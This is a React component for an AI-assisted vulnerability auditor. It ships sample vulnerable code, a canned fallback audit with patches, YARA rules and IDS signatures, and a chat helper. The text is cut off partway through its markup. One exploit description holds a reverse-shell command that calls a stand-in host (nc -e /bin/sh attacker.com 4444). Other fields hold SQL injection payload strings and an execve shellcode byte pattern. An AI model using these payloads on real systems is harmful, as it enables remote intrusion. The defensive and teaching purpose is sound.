import React, { useState, useRef } from 'react';
import { soundEngine } from '../utils/soundEngine';
import { SecurityAuditResult, AuditMode, AuditFollowupMessage } from '../types';

interface AiSecurityAssistantProps {
  initialCode?: string;
}

export const AiSecurityAssistant: React.FC<AiSecurityAssistantProps> = ({ initialCode }) => {
  const [codeSnippet, setCodeSnippet] = useState<string>(
    initialCode || `// Sample React Authentication Hook
export function useUserAuth(userToken: string) {
  useEffect(() => {
    // SECURITY DEFECT: Token passed directly in URL parameter without CSRF protection
    fetch(\`/api/v1/user?token=\${userToken}\`, {
      method: 'GET'
    })
    .then(res => res.json())
    .then(data => localStorage.setItem('user_session', JSON.stringify(data)));
  }, [userToken]);
}`
  );

  React.useEffect(() => {
    if (initialCode) {
      setCodeSnippet(initialCode);
    }
  }, [initialCode]);

  const [activeLanguage, setActiveLanguage] = useState<string>('typescript');
  const [activeMode, setActiveMode] = useState<AuditMode>('full_audit');
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [auditResult, setAuditResult] = useState<SecurityAuditResult | null>(null);
  
  // Tab control in analysis panel
  const [resultTab, setResultTab] = useState<'overview' | 'exploit' | 'diff' | 'yara' | 'chat' | 'export'>('overview');
  
  // Interactive Chat State
  const [chatMessages, setChatMessages] = useState<AuditFollowupMessage[]>([]);
  const [chatInput, setChatInput] = useState<string>('');
  const [isChatLoading, setIsChatLoading] = useState<boolean>(false);
  
  // Copy state feedback
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const presets = [
    {
      label: 'React Insecure Auth',
      lang: 'typescript',
      code: `// Sample React Authentication Hook
export function useUserAuth(userToken: string) {
  useEffect(() => {
    // SECURITY DEFECT: Token passed in URL parameter without CSRF protection
    fetch('/api/v1/user?token=' + userToken, { method: 'GET' })
      .then(res => res.json())
      .then(data => localStorage.setItem('user_session', JSON.stringify(data)));
  }, [userToken]);
}`,
    },
    {
      label: 'SQL Injection Vuln',
      lang: 'javascript',
      code: `// Vulnerable Express Node.js Query
app.get('/api/users/search', async (req, res) => {
  const queryName = req.query.name;
  // SECURITY DEFECT: String concatenation leads to SQL Injection
  const sql = "SELECT * FROM users WHERE username = '" + queryName + "'";
  const result = await db.query(sql);
  res.json(result);
});`,
    },
    {
      label: 'C Buffer Overflow',
      lang: 'c',
      code: `// Vulnerable Memory Copy in C
void process_user_input(char *user_str) {
    char buffer[64];
    // SECURITY DEFECT: strcpy does not check destination buffer boundaries
    strcpy(buffer, user_str);
    printf("Input: %s\\n", buffer);
}`,
    },
    {
      label: 'Solidity Reentrancy',
      lang: 'solidity',
      code: `// Vulnerable Smart Contract Vault
contract VulnerableVault {
    mapping(address => uint) public balances;
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        // SECURITY DEFECT: External call before state update allows reentrancy attack
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
}`,
    },
    {
      label: 'Python Pickle RCE',
      lang: 'python',
      code: `# Unsafe Python Deserialization
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/load_session', methods=['POST'])
def load_session():
    cookie_data = request.cookies.get('session_data')
    # SECURITY DEFECT: Arbitrary code execution via unsafe pickle load
    raw_bytes = base64.b64decode(cookie_data)
    user_obj = pickle.loads(raw_bytes)
    return f"Welcome {user_obj.get('name')}"`,
    },
    {
      label: 'YARA Malware Payload',
      lang: 'yara',
      code: `// Target Obfuscated Malware Strings to Detect
Rule Target Payload:
- Strings: "powershell.exe -enc AAAA...", "cmd.exe /c start"
- Executable header entropy: > 7.8
- Suspicious DLL API imports: VirtualAlloc, WriteProcessMemory`,
    },
  ];

  const handleCopy = (text: string, fieldName: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldName);
    soundEngine.play('click');
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      const content = event.target?.result as string;
      if (content) {
        setCodeSnippet(content);
        soundEngine.play('success');
      }
    };
    reader.readAsText(file);
  };

  const runAudit = async () => {
    if (!codeSnippet.trim()) return;
    setIsLoading(true);
    soundEngine.play('terminal_key');

    try {
      const response = await fetch('/api/security-audit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: codeSnippet, mode: activeMode }),
      });

      if (response.ok) {
        const data: SecurityAuditResult = await response.json();
        setAuditResult(data);
        soundEngine.play('success');
        // Initialize chat intro message
        setChatMessages([
          {
            id: 'init-1',
            sender: 'assistant',
            text: `I have completed the security audit for your ${activeLanguage} payload. Primary finding: **${data.vulnerabilityType}** (Severity: ${data.severity}, Risk Score: ${data.riskScore}/100). Ask me any technical follow-up questions regarding testing, remediation, or weaponization context.`,
            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
          },
        ]);
      } else {
        throw new Error('Fallback required');
      }
    } catch {
      // Local High-Fidelity Fallback Audit Engine
      setTimeout(() => {
        let result: SecurityAuditResult;

        if (codeSnippet.includes('SELECT') || codeSnippet.includes('queryName') || codeSnippet.includes('SQL')) {
          result = {
            vulnerabilityType: 'SQL Injection (SQLi)',
            severity: 'CRITICAL',
            riskScore: 95,
            cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
            owaspCategory: 'A03:2021 - Injection',
            mitreAttck: 'T1190 - Exploit Public-Facing Application',
            cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
            exploitability: 'High',
            analysis:
              'Raw string concatenation in SQL queries allows untrusted attacker input to break out of data literals into SQL code execution. Attackers can dump database credentials, modify records, or bypass authentication.',
            exploitVectorDetails:
              "Attacker passes payload `' OR 1=1 --` or `' UNION SELECT username, password FROM users --` via query string to extract full relational tables.",
            recommendedRemediation:
              'Use parameterized queries, prepared statements, or ORM parameter binding (e.g., Drizzle, Prisma, Knex) to isolate database execution context.',
            patchedSnippet: `// Hardened Parameterized Query
app.get('/api/users/search', async (req, res) => {
  const queryName = req.query.name;
  // Parameterized query prevents SQL injection
  const sql = 'SELECT id, username, email FROM users WHERE username = $1';
  const result = await db.query(sql, [queryName]);
  res.json(result);
});`,
            diffUnified: `--- a/server/routes.js
+++ b/server/routes.js
@@ -3,3 +3,3 @@ app.get('/api/users/search', async (req, res) => {
-  const sql = "SELECT * FROM users WHERE username = '" + queryName + "'";
-  const result = await db.query(sql);
+  const sql = 'SELECT id, username, email FROM users WHERE username = $1';
+  +  const result = await db.query(sql, [queryName]);`,
            yaraRule: `rule SQLi_Attacker_Payload_Detection {
    meta:
        description = "Detects SQL injection string payloads in HTTP URI"
        author = "LABIB B. SHAHED"
        severity = "CRITICAL"
    strings:
        $sqli1 = "' OR 1=1" nocase
        $sqli2 = "' UNION SELECT" nocase
        $sqli3 = "--"
    condition:
        any of ($sqli*)
}`,
            detectionSignature: `alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"OFFSEC - SQL Injection Attack Attempt"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase; classtype:web-application-attack; sid:1000891; rev:1;)`,
          };
        } else if (codeSnippet.includes('strcpy') || codeSnippet.includes('buffer')) {
          result = {
            vulnerabilityType: 'Stack-Based Buffer Overflow',
            severity: 'CRITICAL',
            riskScore: 98,
            cwe: 'CWE-121: Stack-based Buffer Overflow',
            owaspCategory: 'A06:2021 - Vulnerable and Outdated Components',
            mitreAttck: 'T1203 - Exploitation for Client Execution',
            cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
            exploitability: 'High',
            analysis:
              'Unbounded memory copy function strcpy() fails to check destination buffer boundaries. Oversized input corrupts saved frame pointers ($EBP) and overwrites the return address ($EIP) on the stack.',
            exploitVectorDetails:
              'Attacker sends 64-byte cyclic pattern + NOP sled + shellcode to hijack $EIP register control and execute arbitrary payload in memory.',
            recommendedRemediation:
              'Replace unsafe strcpy() with bounded snprintf() or strncpy(), and enable compiler mitigation features (-fstack-protector-all, -Wl,-z,relro,-z,now).',
            patchedSnippet: `// Hardened Memory Copy in C
void process_user_input(const char *user_str) {
    char buffer[64];
    // Bounds-checked copy prevents stack overflow
    snprintf(buffer, sizeof(buffer), "%s", user_str);
    printf("Input: %s\\n", buffer);
}`,
            diffUnified: `--- a/src/main.c
+++ b/src/main.c
@@ -3,3 +3,3 @@ void process_user_input(char *user_str) {
-    strcpy(buffer, user_str);
+    snprintf(buffer, sizeof(buffer), "%s", user_str);`,
            yaraRule: `rule Stack_Buffer_Overflow_Exploit {
    meta:
        description = "Detects NOP sled and shellcode payload pattern"
        author = "LABIB B. SHAHED"
    strings:
        $nop_sled = { 90 90 90 90 90 90 90 90 90 90 }
        $execve = { 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 50 89 e2 53 89 e1 b0 0b cd 80 }
    condition:
        all of them
}`,
            detectionSignature: `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"EXPLOIT - NOP Sled Buffer Overflow Attempt"; content:"|90 90 90 90 90 90 90 90|"; sid:1000121; rev:1;)`,
          };
        } else if (codeSnippet.includes('pickle') || codeSnippet.includes('loads')) {
          result = {
            vulnerabilityType: 'Unsafe Object Deserialization',
            severity: 'CRITICAL',
            riskScore: 92,
            cwe: 'CWE-502: Deserialization of Untrusted Data',
            owaspCategory: 'A08:2021 - Software and Data Integrity Failures',
            mitreAttck: 'T1059 - Command and Scripting Interpreter',
            cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
            exploitability: 'High',
            analysis:
              'Python pickle module executes arbitrary code during object deserialization via the __reduce__() dunder method. Untrusted user data in request cookies triggers immediate Remote Code Execution (RCE).',
            exploitVectorDetails:
              'Attacker constructs custom malicious class implementing __reduce__() returning (os.system, ("nc -e /bin/sh attacker.com 4444",)) encoded in Base64.',
            recommendedRemediation:
              'Never deserialize untrusted user input using pickle. Use structured, safe data interchange formats like JSON (json.loads) or HMAC-signed tokens (itsdangerous / JWT).',
            patchedSnippet: `// Hardened Safe JSON Deserialization
import json
import hmac, hashlib

@app.route('/api/load_session', methods=['POST'])
def load_session():
    token = request.cookies.get('session_data')
    # Validate HMAC signature before JSON decoding
    user_data = verify_and_decode_jwt(token)
    return f"Welcome {user_data.get('name')}"`,
            diffUnified: `--- a/app.py
+++ b/app.py
@@ -8,3 +8,3 @@ def load_session():
-    user_obj = pickle.loads(raw_bytes)
+    user_data = verify_and_decode_jwt(token)`,
            yaraRule: `rule Python_Pickle_RCE_Payload {
    meta:
        description = "Detects weaponized Python pickle object opcode"
    strings:
        $pickle_opcode = { 80 04 95 } // Pickle Protocol 4 Header
        $reduce = "__reduce__"
    condition:
        all of them
}`,
            detectionSignature: `alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"EXPLOIT - Python Pickle Deserialization Attack"; content:"pickle"; sid:1000502; rev:1;)`,
          };
        } else {
          result = {
            vulnerabilityType: 'Insecure Auth Credential Exposure',
            severity: 'HIGH',
            riskScore: 84,
            cwe: 'CWE-598: Information Exposure Through Query Strings in GET Request',
            owaspCategory: 'A07:2021 - Identification and Authentication Failures',
            mitreAttck: 'T1552 - Unsecured Credentials',
            cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
            exploitability: 'Medium',
            analysis:
              'Passing session tokens in URL query strings exposes credentials in HTTP Referer headers, proxy logs, and browser history. Storing tokens in localStorage makes them vulnerable to XSS credential theft.',
            exploitVectorDetails:
              'Script tags injected via XSS read localStorage.getItem("user_session") and exfiltrate raw bearer tokens to attacker command server.',
            recommendedRemediation:
              'Store auth credentials exclusively in HttpOnly, Secure, SameSite=Strict HTTP cookies, and transport tokens via HTTP Authorization Bearer headers over TLS.',
            patchedSnippet: `// Hardened Cookie-Based Auth Fetch
export function useUserAuth() {
  useEffect(() => {
    // Credentials sent via secure HttpOnly cookie header
    fetch('/api/v1/user/me', {
      method: 'GET',
      credentials: 'include',
      headers: { 'Accept': 'application/json' }
    })
    .then(res => res.json())
    .then(user => setUserState(user));
  }, []);
}`,
            diffUnified: `--- a/src/hooks/useUserAuth.ts
+++ b/src/hooks/useUserAuth.ts
@@ -3,3 +3,3 @@ export function useUserAuth(userToken: string) {
-    fetch('/api/v1/user?token=' + userToken, { method: 'GET' })
-    .then(res => res.json())
-    .then(data => localStorage.setItem('user_session', JSON.stringify(data)));
+    fetch('/api/v1/user/me', { method: 'GET', credentials: 'include' })
+    .then(res => res.json())
+    .then(user => setUserState(user));`,
            yaraRule: `rule Insecure_URL_Token_Transport {
    meta:
        description = "Detects session tokens passed in URL query parameter"
    strings:
        $param1 = "token=" nocase
        $param2 = "access_token=" nocase
    condition:
        any of them
}`,
            detectionSignature: `alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"AUTH - Sensitive Token Transmitted in GET URI"; content:"?token="; sid:1000598; rev:1;)`,
          };
        }

        setAuditResult(result);
        setIsLoading(false);
        soundEngine.play('success');

        setChatMessages([
          {
            id: 'init-1',
            sender: 'assistant',
            text: `Security audit completed for **${result.vulnerabilityType}**. Severity: **${result.severity}** (Risk Index: **${result.riskScore}/100**). You can review the threat analysis, hardened diff patch, or YARA signatures below, or ask any follow-up questions directly.`,
            timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
          },
        ]);
      }, 700);
    }
  };

  const handleSendChat = async (questionText?: string) => {
    const textToSend = questionText || chatInput;
    if (!textToSend.trim() || isChatLoading) return;

    const userMsg: AuditFollowupMessage = {
      id: Date.now().toString(),
      sender: 'user',
      text: textToSend,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
    };

    setChatMessages((prev) => [...prev, userMsg]);
    if (!questionText) setChatInput('');
    setIsChatLoading(true);
    soundEngine.play('terminal_key');

    try {
      const response = await fetch('/api/security-audit/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code: codeSnippet,
          auditResult,
          userQuestion: textToSend,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        const aiMsg: AuditFollowupMessage = {
          id: (Date.now() + 1).toString(),
          sender: 'assistant',
          text: data.answer,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        };
        setChatMessages((prev) => [...prev, aiMsg]);
        soundEngine.play('success');
      } else {
        throw new Error('Fallback chat');
      }
    } catch {
      setTimeout(() => {
        let answerText = `Regarding your query "${textToSend}":\n\n- **Exploit Testing**: You can reproduce this finding in an isolated sandbox using Burp Suite Repeater or curl.\n- **Defense in Depth**: In addition to the code patch, deploy a Web Application Firewall (WAF) rule to drop malicious request payloads before reaching app servers.\n- **Continuous Assurance**: Integrate static application security testing (SAST) into your CI/CD pipeline to flag this CWE class automatically on code commits.`;

        if (textToSend.toLowerCase().includes('burp') || textToSend.toLowerCase().includes('curl')) {
          answerText = `**Burp Suite / Curl Proof-of-Concept Procedure:**\n\n1. Intercept the HTTP request using Burp Suite Proxy.\n2. Forward request to Repeater tab.\n3. Modify URI parameter or request payload with test boundary input.\n4. Observe HTTP response status code and stack trace leakage.\n\n\`\`\`bash\ncurl -X POST "http://localhost:3000/api/vulnerable-endpoint" \\\n  -H "Content-Type: application/json" \\\n  -d '{"payload": "' OR 1=1 --"}'\n\`\`\``;
        } else if (textToSend.toLowerCase().includes('unit test') || textToSend.toLowerCase().includes('test')) {
          answerText = `**Automated Security Unit Test Pattern (Jest / Vitest):**\n\n\`\`\`typescript\nit('should reject malicious payloads with 400 Bad Request', async () => {\n  const res = await request(app)\n    .post('/api/endpoint')\n    .send({ input: "' OR 1=1 --" });\n  expect(res.status).toBe(400);\n  expect(res.body.error).toBeDefined();\n});\n\`\`\``;
        }

        const aiMsg: AuditFollowupMessage = {
          id: (Date.now() + 1).toString(),
          sender: 'assistant',
          text: answerText,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        };
        setChatMessages((prev) => [...prev, aiMsg]);
        setIsChatLoading(false);
        soundEngine.play('success');
      }, 600);
      return;
    }
    setIsChatLoading(false);
  };

  const getSeverityBadgeColor = (severity?: string) => {
    switch (severity) {
      case 'CRITICAL':
        return 'bg-[#60000e]/50 text-[#ffb4ab] border-[#ffb4ab]/40';
      case 'HIGH':
        return 'bg-[#4a2800]/50 text-[#ffb870] border-[#ffb870]/40';
      case 'MEDIUM':
        return 'bg-[#3e3000]/50 text-[#ffe082] border-[#ffe082]/40';
      case 'LOW':
        return 'bg-[#003756]/50 text-[#7fcfff] border-[#7fcfff]/40';
      default:
        return 'bg-[#004d2e]/50 text-[#a8e6cf] border-[#a8e6cf]/40';
    }
  };

  const getRiskScoreColor = (score: number) => {
    if (score >= 85) return 'text-[#ffb4ab] stroke-[#ffb4ab]';
    if (score >= 70) return 'text-[#ffb870] stroke-[#ffb870]';
    if (score >= 40) return 'text-[#ffe082] stroke-[#ffe082]';
    return 'text-[#a8e6cf] stroke-[#a8e6cf]';
  };

  return (
    <div className="py-2 relative">
      <div className="max-w-7xl mx-auto">
        {/* Section Header */}
        <div className="flex flex-col md:flex-row md:items-end justify-between gap-4 mb-8">
          <div className="space-y-2">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#004a77]/30 border border-[#a8c7fa]/30 text-[#a8c7fa] text-xs font-mono font-semibold uppercase tracking-wider">
              <i className="ri-cpu-line"></i> AI SEC-ENGINE v3.6
            </div>
            <h2 className="text-3xl sm:text-4xl font-bold tracking-tight text-white">
              Vulnerability Auditor & Threat Scanner
            </h2>
            <p className="text-sm text-[#c4c6d0] max-w-2xl font-sans leading-relaxed">
              Real-time deep code analysis powered by Gemini 3.6 Flash. Detect CWE vulnerabilities, generate hardened patches, synthesize YARA detection signatures, and interact with an OffSec AI assistant.
            </p>
          </div>

          {/* Mode Selector Tabs (M3 Segmented Pills) */}
          <div className="bg-[#1d1b20] p-1 rounded-full border border-[#49454f]/30 flex items-center gap-1 self-start md:self-auto">
            <button
              onClick={() => {
                setActiveMode('full_audit');
                soundEngine.play('click');
              }}
              className={`px-3 py-1.5 rounded-full text-xs font-medium font-sans transition-all cursor-pointer flex items-center gap-1.5 ${
                activeMode === 'full_audit'
                  ? 'bg-[#004a77] text-[#c2e7ff] font-semibold'
                  : 'text-[#c4c6d0] hover:text-white hover:bg-[#2b2930]'
              }`}
            >
              <i className="ri-shield-check-line"></i> Full Audit
            </button>
            <button
              onClick={() => {
                setActiveMode('patch_diff');
                soundEngine.play('click');
              }}
              className={`px-3 py-1.5 rounded-full text-xs font-medium font-sans transition-all cursor-pointer flex items-center gap-1.5 ${
                activeMode === 'patch_diff'
                  ? 'bg-[#004a77] text-[#c2e7ff] font-semibold'
                  : 'text-[#c4c6d0] hover:text-white hover:bg-[#2b2930]'
              }`}
            >
              <i className="ri-code-s-slash-line"></i> Patch & Diff
            </button>
            <button
              onClick={() => {
                setActiveMode('yara_gen');
                soundEngine.play('click');
              }}
              className={`px-3 py-1.5 rounded-full text-xs font-medium font-sans transition-all cursor-pointer flex items-center gap-1.5 ${
                activeMode === 'yara_gen'
                  ? 'bg-[#004a77] text-[#c2e7ff] font-semibold'
                  : 'text-[#c4c6d0] hover:text-white hover:bg-[#2b2930]'
              }`}
            >
              <i className="ri-radar-line"></i> YARA / SIEM
            </button>
          </div>
        </div>

        {/* Main Grid: Code Workspace & Audit Results */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
          {/* Left Column: Interactive Code Editor */}
          <div className="lg:col-span-5 space-y-4">
            <div className="bg-[#1d1b20] rounded-2xl border border-[#49454f]/30 p-5 space-y-4 shadow-xl relative overflow-hidden">
              {/* Header bar */}
              <div className="flex items-center justify-between text-xs font-mono border-b border-[#49454f]/20 pb-3">
                <span className="text-[#c4c6d0] font-semibold flex items-center gap-2">
                  <i className="ri-terminal-box-line text-[#a8c7fa] text-base"></i> SOURCE CODE PAYLOAD
                </span>
                
                {/* Language Selector */}
                <select
                  value={activeLanguage}
                  onChange={(e) => setActiveLanguage(e.target.value)}
                  className="bg-[#2b2930] text-[#c2e7ff] border border-[#49454f]/50 rounded-lg px-2.5 py-1 text-[11px] font-mono focus:outline-none focus:border-[#a8c7fa] cursor-pointer"
                >
                  <option value="typescript">TypeScript / JS</option>
                  <option value="javascript">Node.js Express</option>
                  <option value="c">C / C++ (Memory)</option>
                  <option value="python">Python / Flask</option>
                  <option value="solidity">Solidity Smart Contract</option>
                  <option value="yara">YARA / Malware Payload</option>
                </select>
              </div>

              {/* Preset Buttons */}
              <div className="space-y-1.5">
                <div className="text-[10px] font-mono text-[#8e9199] uppercase tracking-wider flex items-center justify-between">
                  <span>Quick Vulnerability Presets:</span>
                  <button
                    onClick={() => {
                      const randomPreset = presets[Math.floor(Math.random() * presets.length)];
                      setCodeSnippet(randomPreset.code);
                      setActiveLanguage(randomPreset.lang);
                      soundEngine.play('click');
                    }}
                    className="text-[#a8c7fa] hover:underline cursor-pointer lowercase"
                  >
                    🎲 random sample
                  </button>
                </div>
                <div className="flex flex-wrap gap-1.5">
                  {presets.map((preset, idx) => (
                    <button
                      key={idx}
                      onClick={() => {
                        setCodeSnippet(preset.code);
                        setActiveLanguage(preset.lang);
                        soundEngine.play('click');
                      }}
                      className="px-2.5 py-1 rounded-full bg-[#2b2930] hover:bg-[#36343b] border border-[#49454f]/40 text-[11px] font-mono text-[#c4c6d0] hover:text-white transition-all cursor-pointer whitespace-nowrap"
                    >
                      {preset.label}
                    </button>
                  ))}
                </div>
              </div>

              {/* Editor Toolbar & Textarea */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-[11px] font-mono text-[#8e9199]">
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => fileInputRef.current?.click()}
                      className="text-[#a8c7fa] hover:text-white flex items-center gap-1 cursor-pointer"
                      title="Upload local code file"
                    >
                      <i className="ri-upload-2-line"></i> Upload File
                    </button>
                    <input
                      type="file"
                      ref={fileInputRef}
                      onChange={handleFileUpload}
                      className="hidden"
                      accept=".js,.ts,.py,.c,.cpp,.sol,.yara,.json,.txt"
                    />
                    <span>•</span>
                    <button
                      onClick={() => handleCopy(codeSnippet, 'code')}
                      className="text-[#a8c7fa] hover:text-white flex items-center gap-1 cursor-pointer"
                    >
                      <i className="ri-file-copy-line"></i> {copiedField === 'code' ? 'Copied!' : 'Copy'}
                    </button>
                  </div>
                  <span>{codeSnippet.length} chars | {codeSnippet.split('\n').length} lines</span>
                </div>

                <div className="relative rounded-xl overflow-hidden border border-[#49454f]/40 bg-[#141218]">
                  <textarea
                    value={codeSnippet}
                    onChange={(e) => setCodeSnippet(e.target.value)}
                    rows={12}
                    className="w-full bg-transparent p-3.5 font-mono text-xs text-[#e6e0e9] focus:outline-none resize-none leading-relaxed"
                    placeholder="Paste source code or security snippet here..."
                    spellCheck={false}
                  ></textarea>
                </div>
              </div>

              {/* Submit Button */}
              <button
                onClick={runAudit}
                disabled={isLoading}
                className="m3-btn-primary w-full justify-center text-xs tracking-wider cursor-pointer disabled:opacity-50 py-3"
              >
                {isLoading ? (
                  <>
                    <i className="ri-loader-4-line animate-spin text-base"></i>
                    <span>ANALYZING THREAT VECTORS (GEMINI AI)...</span>
                  </>
                ) : (
                  <>
                    <i className="ri-shield-flash-line text-base"></i>
                    <span>EXECUTE AI SECURITY AUDIT</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Right Column: Dynamic Audit Results & Interactive Tools */}
          <div className="lg:col-span-7 space-y-4">
            <div className="bg-[#1d1b20] rounded-2xl border border-[#49454f]/30 p-6 min-h-[580px] flex flex-col justify-between shadow-xl">
              {auditResult ? (
                <div className="space-y-5">
                  {/* Result Header & Risk Meter Gauge */}
                  <div className="bg-[#211f26] p-4 rounded-xl border border-[#49454f]/30 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className="text-[10px] font-mono font-semibold text-[#8e9199] uppercase">
                          AI AUDIT REPORT FINDING
                        </span>
                        <span className={`px-2.5 py-0.5 rounded-full font-mono text-[10px] font-bold border ${getSeverityBadgeColor(auditResult.severity)}`}>
                          {auditResult.severity}
                        </span>
                      </div>
                      <h3 className="text-lg sm:text-xl font-bold text-white tracking-tight">
                        {auditResult.vulnerabilityType}
                      </h3>
                      <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono text-[#a8c7fa] pt-1">
                        <span className="bg-[#141218] px-2 py-0.5 rounded border border-[#49454f]/30">{auditResult.cwe}</span>
                        {auditResult.owaspCategory && (
                          <span className="bg-[#141218] px-2 py-0.5 rounded border border-[#49454f]/30 text-[#e8def8]">{auditResult.owaspCategory}</span>
                        )}
                        {auditResult.mitreAttck && (
                          <span className="bg-[#141218] px-2 py-0.5 rounded border border-[#49454f]/30 text-[#ffb870]">{auditResult.mitreAttck}</span>
                        )}
                      </div>
                    </div>

                    {/* Circular Risk Score Meter */}
                    <div className="flex items-center gap-3 bg-[#141218] px-3.5 py-2 rounded-xl border border-[#49454f]/30 shrink-0 self-stretch sm:self-auto justify-center">
                      <div className="text-right font-mono">
                        <div className="text-[10px] text-[#8e9199] uppercase">THREAT SCORE</div>
                        <div className={`text-xl font-bold ${getRiskScoreColor(auditResult.riskScore)}`}>
                          {auditResult.riskScore} <span className="text-xs text-[#8e9199]">/ 100</span>
                        </div>
                      </div>
                      <div className="w-10 h-10 relative flex items-center justify-center">
                        <svg className="w-10 h-10 -rotate-90" viewBox="0 0 36 36">
                          <path
                            className="stroke-[#2b2930]"
                            strokeWidth="3.5"
                            fill="none"
                            d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                          />
                          <path
                            className={getRiskScoreColor(auditResult.riskScore)}
                            strokeDasharray={`${auditResult.riskScore}, 100`}
                            strokeWidth="3.5"
                            strokeLinecap="round"
                            fill="none"
                            d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831"
                          />
                        </svg>
                      </div>
                    </div>
                  </div>

                  {/* Navigation Tabs for Audit Findings */}
                  <div className="border-b border-[#49454f]/30 flex items-center gap-1 overflow-x-auto pb-1 font-sans text-xs">
                    <button
                      onClick={() => setResultTab('overview')}
                      className={`px-3 py-1.5 rounded-t-lg transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5 font-medium ${
                        resultTab === 'overview'
                          ? 'bg-[#2b2930] text-[#a8c7fa] border-b-2 border-[#a8c7fa]'
                          : 'text-[#c4c6d0] hover:text-white'
                      }`}
                    >
                      <i className="ri-information-line"></i> Analysis & Vector
                    </button>
                    <button
                      onClick={() => setResultTab('diff')}
                      className={`px-3 py-1.5 rounded-t-lg transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5 font-medium ${
                        resultTab === 'diff'
                          ? 'bg-[#2b2930] text-[#a8c7fa] border-b-2 border-[#a8c7fa]'
                          : 'text-[#c4c6d0] hover:text-white'
                      }`}
                    >
                      <i className="ri-code-line"></i> Hardened Patch & Diff
                    </button>
                    <button
                      onClick={() => setResultTab('yara')}
                      className={`px-3 py-1.5 rounded-t-lg transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5 font-medium ${
                        resultTab === 'yara'
                          ? 'bg-[#2b2930] text-[#a8c7fa] border-b-2 border-[#a8c7fa]'
                          : 'text-[#c4c6d0] hover:text-white'
                      }`}
                    >
                      <i className="ri-radar-line"></i> YARA / SIEM Rule
                    </button>
                    <button
                      onClick={() => setResultTab('chat')}
                      className={`px-3 py-1.5 rounded-t-lg transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5 font-medium ${
                        resultTab === 'chat'
                          ? 'bg-[#2b2930] text-[#a8c7fa] border-b-2 border-[#a8c7fa]'
                          : 'text-[#c4c6d0] hover:text-white'
                      }`}
                    >
                      <i className="ri-chat-voice-line text-[#e8def8]"></i> AI Follow-up Q&A
                    </button>
                    <button
                      onClick={() => setResultTab('export')}
                      className={`px-3 py-1.5 rounded-t-lg transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5 font-medium ${
                        resultTab === 'export'
                          ? 'bg-[#2b2930] text-[#a8c7fa] border-b-2 border-[#a8c7fa]'
                          : 'text-[#c4c6d0] hover:text-white'
                      }`}
                    >
                      <i className="ri-download-2-line"></i> Export
                    </button>
                  </div>

                  {/* TAB 1: OVERVIEW & THREAT VECTOR */}
                  {resultTab === 'overview' && (
                    <div className="space-y-4 font-sans text-xs">
                      {/* Analysis Box */}
                      <div className="space-y-1.5">
                        <div className="font-mono text-[11px] font-semibold text-[#c4c6d0] flex items-center gap-1.5">
                          <i className="ri-alert-line text-[#ffb4ab]"></i> TECHNICAL THREAT VECTOR ANALYSIS
                        </div>
                        <p className="text-[#c4c6d0] leading-relaxed bg-[#141218] p-3.5 rounded-xl border border-[#49454f]/30">
                          {auditResult.analysis}
                        </p>
                      </div>

                      {/* Exploit Vector Details */}
                      {auditResult.exploitVectorDetails && (
                        <div className="space-y-1.5">
                          <div className="font-mono text-[11px] font-semibold text-[#ffb870] flex items-center gap-1.5">
                            <i className="ri-sword-line"></i> WEAPONIZATION MECHANICS & EXPLOIT PRECONDITIONS
                          </div>
                          <p className="text-[#c4c6d0] leading-relaxed bg-[#141218] p-3.5 rounded-xl border border-[#49454f]/30 font-mono text-[11px]">
                            {auditResult.exploitVectorDetails}
                          </p>
                        </div>
                      )}

                      {/* Recommended Remediation */}
